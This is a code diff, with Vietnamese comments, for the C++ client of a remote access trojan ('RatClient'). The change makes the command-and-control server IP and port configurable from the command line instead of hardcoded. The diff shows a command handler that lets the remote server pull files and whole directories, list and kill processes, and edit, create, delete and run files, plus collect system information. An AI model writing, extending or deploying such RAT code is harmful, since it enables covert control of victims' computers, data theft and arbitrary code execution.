@@ -472,7 +472,8 @@ void SystemInfo::HandleSysInfo() {
 
 class RatClient {
 public:
-    void Start();
+    // Cập nhật phương thức Start nhận địa chỉ IP (và Port nếu cần, mặc định 8080)
+    void Start(const std::string& serverIP, int serverPort = 8080);
 
 private:
     SocketClient client;
@@ -481,16 +482,15 @@ private:
     SystemInfo systemInfo;
 
     void InitClientSocket();
-    void Listen();
+    void Listen(const std::string& serverIP, int serverPort);
 
     void CommandLoop();
     void HandleCommand(const std::string& cmd);
-
 };
 
-void RatClient::Start() {
+void RatClient::Start(const std::string& serverIP, int serverPort) {
     InitClientSocket();
-    Listen();
+    Listen(serverIP, serverPort);
     CommandLoop();
 }
 
@@ -505,20 +505,20 @@ void RatClient::InitClientSocket() {
     }
 }
 
-void RatClient::Listen() {
+void RatClient::Listen(const std::string& serverIP, int serverPort) {
     sockaddr_in serverAddr;
     std::memset(&serverAddr, 0, sizeof(serverAddr));
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(8080); // Cổng trùng với Server
+    serverAddr.sin_port = htons(serverPort); // Dùng Port được truyền vào
 
-    // Chuyển đổi IP từ chuỗi text sang dạng nhị phân
-    if (inet_pton(AF_INET, "192.168.0.2", &serverAddr.sin_addr) <= 0) {
-        std::cerr << "[-] Dia chi IP khong hop le!\n";
+    // Chuyển đổi IP truyền từ tham số dòng lệnh sang dạng nhị phân
+    if (inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr) <= 0) {
+        std::cerr << "[-] Dia chi IP khong hop le: " << serverIP << "\n";
         close(client.socket);
         exit(1);
     }
 
-    std::cout << "[*] Dang ket noi den Server...\n";
+    std::cout << "[*] Dang ket noi den Server (" << serverIP << ":" << serverPort << ")...\n";
     if (connect(client.socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
         std::cerr << "[-] Ket noi that bai!\n";
         close(client.socket);
@@ -547,43 +547,62 @@ void RatClient::HandleCommand(const std::string& command) {
     } 
     else if (command.rfind("GETFILE ", 0) == 0) {
         std::string filename = command.substr(8);
-        fileManager.HandleDownload(filename); // Hàm HandleDownload cũ của bạn
+        fileManager.HandleDownload(filename);
     }
     else if (command.rfind("GETDIR ", 0) == 0) {
         std::string foldername = command.substr(7);
         fileManager.HandleDownloadDir(foldername);
     }
-    else if (command == "PS") { // Lệnh mới cho xem Process
+    else if (command == "PS") {
         processManager.HandleProcessList();
     }
-    else if (command.rfind("KILL ", 0) == 0) { // Thêm nhánh xử lý lệnh KILL
-        std::string pid = command.substr(5); // Cắt lấy phần chuỗi số PID sau chữ "KILL "
+    else if (command.rfind("KILL ", 0) == 0) {
+        std::string pid = command.substr(5);
         processManager.HandleKillProcess(pid);
     }
-    else if (command.rfind("EDITFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh EDITFILE
+    else if (command.rfind("EDITFILE ", 0) == 0) {
         std::string filename = command.substr(9);
         fileManager.HandleEditFile(filename);
     }
-    else if (command.rfind("REMOVEFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh REMOVEFILE
+    else if (command.rfind("REMOVEFILE ", 0) == 0) {
         std::string filename = command.substr(11);
         fileManager.HandleRemoveFile(filename);
     }
-    else if (command.rfind("RUNFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh RUNFILE
+    else if (command.rfind("RUNFILE ", 0) == 0) {
         std::string filepath = command.substr(8);
         fileManager.HandleRunFile(filepath);
     }
-    else if (command.rfind("CREATEFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh CREATEFILE
+    else if (command.rfind("CREATEFILE ", 0) == 0) {
         std::string filename = command.substr(11);
         fileManager.HandleCreateFile(filename);
     }
-    else if (command == "SYSINFO") { // Thêm nhánh xử lý lệnh SYSINFO
+    else if (command == "SYSINFO") {
         systemInfo.HandleSysInfo();
     }
 }
 
 
 
-int main() {
+int main(int argc, char* argv[]) {
+    // Giá trị IP mặc định nếu không truyền tham số
+    std::string serverIP = "192.168.1.1"; 
+    int serverPort = 8080;
+
+    if (argc >= 2) {
+        // Lấy IP từ tham số thứ 1 truyền vào: ./client <SERVER_IP>
+        serverIP = argv[1]; 
+    } else {
+        std::cout << "[i] Khong truyen IP. Su dung IP mac dinh: " << serverIP << "\n";
+        std::cout << "[i] Cu phap truyen IP: " << argv[0] << " <SERVER_IP> [PORT]\n\n";
+    }
+
+    if (argc >= 3) {
+        // (Tùy chọn) Lấy Port từ tham số thứ 2 nếu muốn: ./client <SERVER_IP> <PORT>
+        serverPort = std::atoi(argv[2]);
+    }
+
     RatClient client;
-    client.Start();
+    client.Start(serverIP, serverPort);
+
+    return 0;
 }
